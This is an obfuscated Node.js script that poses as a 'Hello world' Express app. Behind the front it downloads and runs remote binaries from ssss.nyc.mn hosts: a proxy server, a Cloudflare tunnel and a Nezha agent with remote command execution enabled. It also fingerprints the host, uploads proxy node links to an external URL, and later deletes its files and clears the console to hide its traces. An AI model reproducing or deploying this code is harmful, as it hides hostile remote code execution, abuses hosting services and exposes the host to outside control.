const y=b;(function(c,d){const x=b,e=c();while(!![]){try{const f=-parseInt(x(0x194))/0x1*(-parseInt(x(0x166))/0x2)+parseInt(x(0x13d))/0x3*(-parseInt(x(0x1b1))/0x4)+parseInt(x(0x14d))/0x5*(parseInt(x(0x13e))/0x6)+-parseInt(x(0x144))/0x7+-parseInt(x(0x192))/0x8+parseInt(x(0x15d))/0x9+parseInt(x(0x196))/0xa;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x3e564));const express=require(y(0x1d0)),app=express(),axios=require(y(0x18f)),os=require('os'),fs=require('fs'),path=require(y(0x1fa)),{promisify}=require(y(0x158)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[y(0x16b)][y(0x1f7)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][y(0x16a)]||![],FILE_PATH=process[y(0x16b)][y(0x18b)]||y(0x1f8),SUB_PATH=process[y(0x16b)][y(0x1e8)]||y(0x140),PORT=process[y(0x16b)][y(0x173)]||process[y(0x16b)][y(0x1da)]||0xbb8,UUID=process[y(0x16b)][y(0x19f)]||y(0x1a9),NEZHA_SERVER=process[y(0x16b)]['NEZHA_SERVER']||'',NEZHA_PORT=process[y(0x16b)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][y(0x1d1)]||'',ARGO_DOMAIN=process['env'][y(0x151)]||y(0x1c5),ARGO_AUTH=process[y(0x16b)]['ARGO_AUTH']||y(0x1fb),ARGO_PORT=process['env'][y(0x1ce)]||0x12cd,CFIP=process[y(0x16b)][y(0x185)]||'cdns.doon.eu.org',CFPORT=process[y(0x16b)][y(0x171)]||0x1bb,NAME=process['env'][y(0x1d5)]||'us';!fs[y(0x1d2)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[y(0x19b)](FILE_PATH+y(0x160))):console[y(0x19b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const z=y,c=z(0x1e5);let d='';for(let e=0x0;e<0x6;e++){d+=c[z(0x14e)](Math[z(0x1c8)](Math[z(0x183)]()*c[z(0x15c)]));}return d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[y(0x1a5)](FILE_PATH,npmName),phpPath=path[y(0x1a5)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[y(0x1a5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,y(0x1bf)),listPath=path[y(0x1a5)](FILE_PATH,y(0x172)),bootLogPath=path[y(0x1a5)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,y(0x1b9));function b(c,d){const e=a();return b=function(f,g){f=f-0x13b;let h=e[f];if(b['qIqJDG']===undefined){var i=function(m){const n='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let o='',p='';for(let q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0){s=n['indexOf'](s);}for(let u=0x0,v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['oSCKQV']=i,c=arguments,b['qIqJDG']=!![];}const j=e[0x0],k=f+j,l=c[k];return!l?(h=b['oSCKQV'](h),c[k]=h):h=l,h;},b(c,d);}function a(){const a4=['zxHWCMvZCW','tKvAsefFs0vz','zxHPC3rZu3LUyW','rw1WB3DLCM1LBNqGC3vJy2vZCYbMB3iG','u2TPChbPBMCGywrKAw5Nigf1Dg9TyxrPyYbHy2nLC3mGDgfZAW','tKfnrq','DhvUBMvSlNLTBa','yMXHy2TOB2XL','y2f0y2G','yw1K','ue9sva','C3rHDhvZ','cNvZzv9NAxrLzv90B191CgDYywrLoIbMywXZzqP1C2vFAxb2nL9JB3vUDhj5x2nVzgu6igzHBhnLcNv1Awq6ia','zgf0yq','rxjYB3iGzg93BMXVywrPBMCGzMLSzxm6','D2vIihj1BM5PBMCGzxjYB3i6ia','l2nVBMzPzY5QC29Uid4Vzgv2l251BgWGmJ4MmsaM','CMvHzezPBgvtEw5J','DgXZ','ihn1y2nLC3nMDwXSEq','B3jN','ywjJzgvMz2HPAMTSBw5VChfYC3r1DND4ExO','D2LUmZi','zMLSDgvY','u1vcx1bbveG','DhvUBMvSic0TzwrNzs1PCc12zxjZAw9Uigf1Dg8Gls1UBY1HDxrVDxbKyxrLic0TChjVDg9JB2WGAhr0CdiGls1SB2DMAwXLia','Ahr0Chm6lY9HCM02nc5ZC3nZlM55yY5TBI93zwi','l2fWAs9HzgqTC3vIC2nYAxb0Aw9UCW','y291BNrYEv9JB2rL','l3zTzxnZlwfYz28/zwq9mJu2ma','C3rYzwfT','odq0mW','qvjht19bvvriig1PC21HDgnOifr1BM5LBfnLy3jLDcX1C2uGDg9Rzw4Gy29UBMvJDcb0BYb0Dw5UzwW','zM9YrwfJAa','ywfYy2G2na','Ahr0Chm6lY9VB29VlNnLCNyWmc5UzxqVywrKlxvYBa','mJa5nG','yxjTnJq','cIaGChjVDg9JB2W6igH0DhaYcIaGcIaGAw5NCMvZCZOkicaGic0GAg9ZDg5HBwu6ia','vvbmt0fex1vsta','lI90Bxa','AgfZ','Cgf0Aa','zxLkAeLQB2LoALL6tvDnme9hrxPov1f3t0Djmu9hrtvzv1L6turfnu0YsxLnBu5RwKrjAuXdsJbjAM9PtJjoBu4YuxLzELv0wLrvEfPPmdbovfL3tfDkBe5QA3rpvezQtLrsA1PQvtfnrgrTswL3Awn5stzjAZr5vfrgufjfvJnuBxbgzeuXCvvuvK9Hvef3vfvKuMvvEfHsvezpywXwmfDyCfznmdvXwNPwwMfTAhjuBNbktvnkoq','p2vUy3j5ChrPB249BM9UzszZzwn1CML0Et10BhmMC25Ppq','qvjht19et01bsu46','igLZihj1BM5PBMC','rg93BMXVywqG','lMv4zsa+ig51BcaYpIyX','jNbHDgG9jtjgDhjVAMfUlwfYz28Lm0zLzcuZrdi1nJaJ','otmZz2X4EhnZ','nZC0v1bouerl','jMzWpwzPCMvMB3GMDhLWzt13CYzOB3n0pq','DNL2DxmTmJaYnq','BwvZC2fNzq','l2fWAs9KzwXLDguTBM9Kzxm','l3zSzxnZlwfYz28','mZiXotmYmw1mB1HhtG','CgHWihj1BM5PBMCGzxjYB3i6ia','DhvUBMvSic0TzwrNzs1PCc12zxjZAw9Uigf1Dg8Gls1UBY1HDxrVDxbKyxrLic0TChjVDg9JB2WGAhr0CdiGCNvUic0TDg9Rzw4G','y2XLyxi','cNzSzxnZoI8V','qvjht19et01bsu4GB3iGqvjht19bvvriihzHCMLHyMXLigLZigvTChr5lcb1C2uGCxvPy2SGDhvUBMvSCW','ywXS','yxjT','Ahr0ChmRBg9JywW6lY84lJGUoc44l2rUCY1XDwvYEq','nJK4nuf0EwzLvG','y2HHCKf0','vw5RBM93BG','DgvZDa','qvjht19et01bsu4','Cg9ZDa','id4Vzgv2l251BgWGmJ4MmsaM','l3zTzxnZlwfYz28','C3vIC3rYAw5N','l3n1yI50EhqGC2f2zwqGC3vJy2vZC2z1BgX5','ls10Bhm','DxrPBa','DgnW','C3vJy2vZCW','DgfZA2TPBgWGl2yGl2LTia','BgvUz3rO','ndaWmJu4oefnuwXWvq','l2nVBMzPzY55yw1SiIa+l2rLDI9UDwXSidi+jJeGjG','CgTPBgWGlwyGiLS','igLZignYzwf0zwq','yxjJAa','qxjNB0rVBwfPBIbUB3qGzM91BMqSihjLlxj1BM5PBMCGyM90ihrVig9IDgfPBIbbCMDVrg9TywLU','C3bSAxq','ChvZAa','C3rHDfn5BMm','mJC4DKjIDvPl','Ahr0Chm6lY9HBwq2nc5ZC3nZlM55yY5TBI92mq','BNbTihj1BM5PBMCGzxjYB3i6ia','mJa1mW','qvvut19bq0nfu1m','zw52','DhjVAMfU','l3r1BM5LBc55BwWGCNvU','EhrSCY1YChj4lxzPC2LVBG','y291BNrYEunVzgu','l2rLDI9UDwXS','q0zqt1ju','BgLZDc50Ehq','u0vsvKvsx1bpuLq','id4Vzgv2l251BgWGmJ4Mmq','cNnRAxbFy29UBMvJDgLVBL9JB3vUDdOGDhj1zqPZA2LWx3bYB2nZx2nVDw50oIb0CNvLcNrLBxbLCMf0DxjLoIbMywXZzqP0Bhm6ia','DxrMltG','BwfW','C2v0','yM9VDc5SB2C','y29UzMLNlNLHBwW','AxngAwXL','zMLSzvvYBa','CM0GlxjMia','Ahr0CcbZzxj2zxiGAxmGCNvUBMLUzYbVBIbWB3j0oG','zMLYzwzVEa','zgvSic9Mic9Xia','q2fUj3qGzMLUzcbHigzPBguGzM9YihrOzsbJDxjYzw50igfYy2HPDgvJDhvYzq','Aw5JBhvKzxm','CMfUzg9T','Ahr0Chm6lY9HBwq2nc5ZC3nZlM55yY5TBI93zwi','q0zjua','zMLUAxnO','qwrKigf1Dg9TyxrPyYbHy2nLC3mGDgfZAYbMywLSzdOG','iIa+ic9KzxyVBNvSBcaYpIyX','cIaGicaGig9YAwDPBLjLCxvLC3q6cIaGicaGicaGBM9utfnwzxjPzNK6ihrYDwukicaGic0GC2vYDMLJztOGAhr0Cf9ZDgf0Dxm6nda0cIaG','ic1Wia','rKLmrv9qqvri','mti3lJaUmc4X','DMXLC3m','z2v0','yxHPB3m','CgXHDgzVCM0','C2vUza','otCZmJqWDvDbvxPJ','q29UDgvUDc1uExbL','mJyYoxL6DwLKCq','ndqZ','mtqXmdmXmfPhtxjhsW','yMXVy2S','igzHAwXLzdOG','zgLYzwn0','mJa4nW','Bg9N','qxbWigLZihj1BM5PBMC','D3jPDgvgAwXLu3LUyW','ic0TzgLZywjSzs1HDxrVlxvWzgf0zsaTlxjLCg9YDc1KzwXHEsa0ic0TC2TPCc1JB25Uic0TC2TPCc1WCM9JCYa+l2rLDI9UDwXSidi+jJeGjG','vvvjra','zxjYB3i','CxvPyW','BM9ODxaG','rxjYB3iGAw4GC3rHCNrZzxj2zxi6','yMfZzw5HBwu','AM9PBG','yxbWBgLJyxrPB24VANnVBG','qxjNB0rVBwfPBJO','Ahr0Chm6lY9HCM02nc5ZC3nZlM55yY5TBI9Hz2vUDa','otG4ndG5ywyTn2rIzc00ntLJltKYnwqTmdHJnJqXyJG4yJLK','Ahr0CdOVl2LWlwfWAs5JB20VANnVBI8','l3rYB2PHBI1HCMDV','zNjVBq','Dgv4Dc9WBgfPBJSGy2HHCNnLDd11DgyToa','DhvUBMvSlMPZB24','BM9Uzq','vw5Oyw5KBgvKigvYCM9YigLUihn0yxj0C2vYDMvYoG','mZC4ohfhDezNva','Ahr0Chm6lY9PCgfWAs5JBY9QC29UlW','Ahr0Ca','zMLSzu5HBwu','Dg9tDhjPBMC','Dhj1zq','C3rYAw5NAwz5','rw1WB3DLCM1LBNqGzMfPBgvKigzVCIa','y29UzMLNlMPZB24','cGP0CM9Qyw46lY8','CMvZCg9UC2u','ic1Jici','Bwf0y2G','cIaGica','C3vIlNr4Da','CgLWzq','vgHHBMSGEw91igzVCIb1C2LUzYb0AgLZihnJCMLWDcWGzw5QB3KH','yMfZzty0','cIaGDhvUBMvSoIa','mJa4mW','DxmXlNz5DI54mtaUBxG','yxv0B21HDgLJigfJy2vZCYb0yxnRigfKzgvKihn1y2nLC3nMDwXSEq','Dw5SAw5Ru3LUyW','zMXVB3i','Ahr0Chm6lY9HBwq2nc5ZC3nZlM55yY5TBI9IB3q','tM9KzxmGDxbSB2fKzwqGC3vJy2vZC2z1BgX5','Ahr0Chm6lY9HCM02nc5ZC3nZlM55yY5TBI9IB3q','y3jLyxrLv3jPDgvtDhjLyw0','cIaGy3jLzgvUDgLHBhmTzMLSztOG','qvjht19qt1ju','Dw5ZAgLMDa'];a=function(){return a4;};return a();}function deleteNodes(){const A=y;try{if(!UPLOAD_URL)return;if(!fs[A(0x1d2)](subPath))return;let c;try{c=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const d=Buffer['from'](c,A(0x1c2))[A(0x1b5)]('utf-8'),e=d[A(0x163)]('\x0a')[A(0x1e7)](f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[A(0x150)](f));if(e[A(0x15c)]===0x0)return;return axios[A(0x152)](UPLOAD_URL+A(0x142),JSON[A(0x1b7)]({'nodes':e}),{'headers':{'Content-Type':'application/json'}})[A(0x1d8)](f=>{return null;}),null;}catch(f){return null;}}function cleanupOldFiles(){const B=y;try{const c=fs['readdirSync'](FILE_PATH);c[B(0x1f1)](d=>{const C=B,e=path['join'](FILE_PATH,d);try{const f=fs[C(0x165)](e);f[C(0x17b)]()&&fs['unlinkSync'](e);}catch(g){}});}catch(d){}}app[y(0x18e)]('/',function(c,d){const D=y;d[D(0x191)]('Hello\x20world!');});async function generateConfig(){const E=y,c={'log':{'access':E(0x170),'error':'/dev/null','loglevel':E(0x1af)},'inbounds':[{'port':ARGO_PORT,'protocol':E(0x18d),'settings':{'clients':[{'id':UUID,'flow':E(0x16e)}],'decryption':E(0x1af),'fallbacks':[{'dest':0xbb9},{'path':E(0x143),'dest':0xbba},{'path':E(0x154),'dest':0xbbb},{'path':E(0x1ab),'dest':0xbbc}]},'streamSettings':{'network':E(0x159)}},{'port':0xbb9,'listen':E(0x18c),'protocol':E(0x18d),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':E(0x159),'security':E(0x1af)}},{'port':0xbba,'listen':E(0x18c),'protocol':E(0x18d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':E(0x1af)},'streamSettings':{'network':'ws','security':E(0x1af),'wsSettings':{'path':E(0x143)}},'sniffing':{'enabled':!![],'destOverride':[E(0x1b3),E(0x1e2),E(0x1a1)],'metadataOnly':![]}},{'port':0xbbb,'listen':E(0x18c),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',E(0x1e2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':E(0x16c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':E(0x1af),'wsSettings':{'path':E(0x1ab)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[E(0x14c)]},'outbounds':[{'protocol':'freedom','tag':E(0x199)},{'protocol':E(0x1d7),'tag':E(0x197)}]};fs[E(0x19d)](path[E(0x1a5)](FILE_PATH,E(0x1b9)),JSON[E(0x1b7)](c,null,0x2));}function getSystemArchitecture(){const F=y,c=os[F(0x161)]();return c===F(0x14b)||c===F(0x1f5)||c===F(0x1f2)?'arm':F(0x1d9);}function downloadFile(c,d,e){const G=y,f=c;!fs[G(0x1d2)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const g=fs[G(0x1cc)](f);axios({'method':G(0x18e),'url':d,'responseType':G(0x1ee)})['then'](h=>{const H=G;h[H(0x1dd)][H(0x1c0)](g),g['on'](H(0x186),()=>{const I=H;g['close'](),console[I(0x19b)](I(0x1ff)+path[I(0x1a4)](f)+I(0x1e3)),e(null,f);}),g['on'](H(0x1a0),i=>{const J=H;fs['unlink'](f,()=>{});const j=J(0x1ff)+path['basename'](f)+'\x20failed:\x20'+i[J(0x141)];console[J(0x1a0)](j),e(j);});})[G(0x1d8)](h=>{const K=G,i=K(0x1ff)+path[K(0x1a4)](f)+K(0x198)+h[K(0x141)];console['error'](i),e(i);});}async function downloadFilesAndRun(){const L=y,c=getSystemArchitecture(),d=getFilesForArchitecture(c);if(d[L(0x15c)]===0x0){console['log'](L(0x181));return;}const e=d[L(0x177)](i=>{return new Promise((j,k)=>{const M=b;downloadFile(i[M(0x1b4)],i[M(0x17c)],(l,m)=>{l?k(l):j(m);});});});try{await Promise[L(0x14a)](e);}catch(i){console['error'](L(0x1de),i);return;}function f(j){const N=L,k=0x1fd;j[N(0x1f1)](l=>{fs['existsSync'](l)&&fs['chmod'](l,k,m=>{const O=b;m?console[O(0x1a0)](O(0x1b8)+l+':\x20'+m):console[O(0x19b)](O(0x1d3)+l+':\x20'+k[O(0x1b5)](0x8));});});}const g=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];f(g);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const j=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[L(0x163)](':')['pop']():'',k=new Set([L(0x195),'8443',L(0x1f4),'2087','2083','2053']),l=k[L(0x1f9)](j)?L(0x1b6):'false',m='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+L(0x175)+l+L(0x1dc)+UUID;fs[L(0x19d)](path[L(0x1a5)](FILE_PATH,L(0x17a)),m);const n=L(0x1a2)+phpPath+L(0x1bc)+FILE_PATH+L(0x15e);try{await exec(n),console[L(0x19b)](phpName+'\x20is\x20running'),await new Promise(o=>setTimeout(o,0x3e8));}catch(o){console[L(0x1a0)](L(0x145)+o);}}else{let p='';const q=[L(0x195),L(0x1ef),L(0x1f4),L(0x19a),L(0x1c4),L(0x169)];q[L(0x182)](NEZHA_PORT)&&(p=L(0x157));const r='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+L(0x18a)+NEZHA_KEY+'\x20'+p+L(0x19e);try{await exec(r),console['log'](npmName+L(0x1fe)),await new Promise(s=>setTimeout(s,0x3e8));}catch(s){console['error'](L(0x168)+s);}}}else console[L(0x19b)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const h=L(0x1a2)+webPath+'\x20-c\x20'+FILE_PATH+L(0x1e0);try{await exec(h),console['log'](webName+'\x20is\x20running'),await new Promise(t=>setTimeout(t,0x3e8));}catch(t){console[L(0x1a0)](L(0x1df)+t);}if(fs[L(0x1d2)](botPath)){let u;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))u=L(0x146)+ARGO_AUTH;else ARGO_AUTH[L(0x1bd)](/TunnelSecret/)?u='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+L(0x16d):u=L(0x1e9)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(L(0x1a2)+botPath+'\x20'+u+L(0x153)),console['log'](botName+L(0x1fe)),await new Promise(v=>setTimeout(v,0x7d0));}catch(v){console[L(0x1a0)]('Error\x20executing\x20command:\x20'+v);}}await new Promise(w=>setTimeout(w,0x1388));}function getFilesForArchitecture(c){const P=y;let d;c===P(0x14b)?d=[{'fileName':webPath,'fileUrl':P(0x1ea)},{'fileName':botPath,'fileUrl':P(0x1cb)}]:d=[{'fileName':webPath,'fileUrl':P(0x184)},{'fileName':botPath,'fileUrl':P(0x1c9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const e=c===P(0x14b)?P(0x1a8):'https://amd64.ssss.nyc.mn/agent';d[P(0x1cf)]({'fileName':npmPath,'fileUrl':e});}else{const f=c===P(0x14b)?'https://arm64.ssss.nyc.mn/v1':P(0x167);d[P(0x1cf)]({'fileName':phpPath,'fileUrl':f});}}return d;}function argoType(){const Q=y;if(!ARGO_AUTH||!ARGO_DOMAIN){console[Q(0x19b)](Q(0x149));return;}if(ARGO_AUTH[Q(0x182)]('TunnelSecret')){fs[Q(0x19d)](path[Q(0x1a5)](FILE_PATH,Q(0x1ae)),ARGO_AUTH);const c=Q(0x1c3)+ARGO_AUTH['split']('\x22')[0xb]+Q(0x1cd)+path[Q(0x1a5)](FILE_PATH,Q(0x1ae))+Q(0x1f6)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+Q(0x189);fs[Q(0x19d)](path['join'](FILE_PATH,Q(0x1d6)),c);}else console[Q(0x19b)](Q(0x1f0));}async function extractDomains(){const R=y;let c;if(ARGO_AUTH&&ARGO_DOMAIN)c=ARGO_DOMAIN,console[R(0x19b)](R(0x1fd),c),await e(c);else try{const f=fs[R(0x1e1)](path['join'](FILE_PATH,R(0x179)),R(0x176)),g=f['split']('\x0a'),h=[];g[R(0x1f1)](i=>{const S=R,j=i[S(0x1bd)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(j){const k=j[0x1];h['push'](k);}});if(h[R(0x15c)]>0x0)c=h[0x0],console['log'](R(0x1a7),c),await e(c);else{console['log'](R(0x162)),fs[R(0x1c7)](path[R(0x1a5)](FILE_PATH,R(0x179)));async function i(){const T=R;try{process[T(0x190)]===T(0x1e6)?await exec(T(0x15b)+botName+T(0x13b)):await exec(T(0x15f)+botName['charAt'](0x0)+']'+botName[T(0x155)](0x1)+T(0x188));}catch(k){}}i(),await new Promise(k=>setTimeout(k,0xbb8));const j='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(R(0x1a2)+botPath+'\x20'+j+R(0x153)),console[R(0x19b)](botName+R(0x1fe)),await new Promise(k=>setTimeout(k,0xbb8)),await extractDomains();}catch(k){console[R(0x1a0)]('Error\x20executing\x20command:\x20'+k);}}}catch(l){console['error']('Error\x20reading\x20boot.log:',l);}async function d(){const U=R;try{const m=await axios[U(0x18e)](U(0x1b2),{'timeout':0xbb8});if(m[U(0x1dd)]&&m[U(0x1dd)]['country_code']&&m[U(0x1dd)]['org'])return m[U(0x1dd)][U(0x1ec)]+'_'+m[U(0x1dd)][U(0x1e4)];}catch(n){try{const o=await axios[U(0x18e)](U(0x1aa),{'timeout':0xbb8});if(o[U(0x1dd)]&&o[U(0x1dd)][U(0x1db)]===U(0x15a)&&o[U(0x1dd)][U(0x16f)]&&o[U(0x1dd)][U(0x1e4)])return o[U(0x1dd)][U(0x16f)]+'_'+o['data'][U(0x1e4)];}catch(p){}}return U(0x14f);}async function e(m){const n=await d(),o=NAME?NAME+'-'+n:n;return new Promise(p=>{setTimeout(()=>{const V=b,q={'v':'2','ps':''+o,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':V(0x1af),'host':m,'path':V(0x1ed),'tls':V(0x1e2),'sni':m,'alpn':'','fp':V(0x17f)},r=V(0x148)+UUID+'@'+CFIP+':'+CFPORT+V(0x1fc)+m+V(0x13f)+m+'&path=%2Fvless-argo%3Fed%3D2560#'+o+'\x0a\x0avmess://'+Buffer[V(0x1ac)](JSON[V(0x1b7)](q))['toString'](V(0x1c2))+V(0x1ba)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+m+'&fp=firefox&type=ws&host='+m+V(0x13c)+o+V(0x1be);console[V(0x19b)](Buffer[V(0x1ac)](r)[V(0x1b5)](V(0x1c2))),fs[V(0x19d)](subPath,Buffer[V(0x1ac)](r)[V(0x1b5)](V(0x1c2))),console['log'](FILE_PATH+V(0x156)),uploadNodes(),app[V(0x18e)]('/'+SUB_PATH,(s,t)=>{const W=V,u=Buffer['from'](r)['toString'](W(0x1c2));t[W(0x178)](W(0x193),W(0x1ad)),t[W(0x191)](u);}),p(r);},0x7d0);});}}async function uploadNodes(){const X=y;if(UPLOAD_URL&&PROJECT_URL){const c=PROJECT_URL+'/'+SUB_PATH,d={'subscription':[c]};try{const e=await axios[X(0x152)](UPLOAD_URL+X(0x1eb),d,{'headers':{'Content-Type':X(0x1a6)}});return e&&e[X(0x1db)]===0xc8?(console[X(0x19b)]('Subscription\x20uploaded\x20successfully'),e):null;}catch(f){if(f[X(0x1bb)]){if(f['response'][X(0x1db)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[X(0x1d2)](listPath))return;const g=fs[X(0x1e1)](listPath,X(0x176)),h=g[X(0x163)]('\x0a')['filter'](j=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[X(0x150)](j));if(h[X(0x15c)]===0x0)return;const i=JSON[X(0x1b7)]({'nodes':h});try{const j=await axios[X(0x152)](UPLOAD_URL+'/api/add-nodes',i,{'headers':{'Content-Type':X(0x1a6)}});return j&&j[X(0x1db)]===0xc8?(console[X(0x19b)](X(0x1ca)),j):null;}catch(k){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const Y=b,c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)c[Y(0x164)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&c['push'](phpPath);process[Y(0x190)]===Y(0x1e6)?exec(Y(0x180)+c[Y(0x1a5)]('\x20')+'\x20>\x20nul\x202>&1',d=>{const Z=Y;console['clear'](),console['log'](Z(0x19c)),console[Z(0x19b)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(Y(0x17d)+c[Y(0x1a5)]('\x20')+Y(0x174),d=>{const a0=Y;console[a0(0x147)](),console[a0(0x19b)](a0(0x19c)),console['log'](a0(0x1c1));});},0x15f90);}cleanFiles();async function AddVisitTask(){const a1=y;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](a1(0x1d4));return;}try{const c=await axios[a1(0x152)](a1(0x1f3),{'url':PROJECT_URL},{'headers':{'Content-Type':a1(0x1a6)}});return console[a1(0x19b)](a1(0x1c6)),c;}catch(d){return console[a1(0x1a0)](a1(0x187)+d[a1(0x141)]),null;}}async function startserver(){const a2=y;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(c){console[a2(0x1a0)](a2(0x1a3),c);}}startserver()[y(0x1d8)](c=>{const a3=y;console[a3(0x1a0)](a3(0x1b0),c);}),app['listen'](PORT,()=>console[y(0x19b)](y(0x17e)+PORT+'!'));
